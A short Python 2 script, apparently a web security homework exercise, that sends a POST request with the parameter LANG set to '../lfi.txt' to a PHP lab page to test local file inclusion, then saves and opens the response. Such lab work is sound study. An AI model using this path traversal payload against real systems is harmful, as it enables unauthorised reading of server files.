import urllib, urllib2
import webbrowser

url = 'http://www.wsb.com/Homework3/case03.php'

value = dict(LANG = '../lfi.txt')
data = urllib.urlencode(value)

req = urllib2.Request(url, data)
rsp = urllib2.urlopen(req)

with open('target.html', 'w') as f:
    f.write(rsp.read())

new = 2
webbrowser.open('target.html', new=new)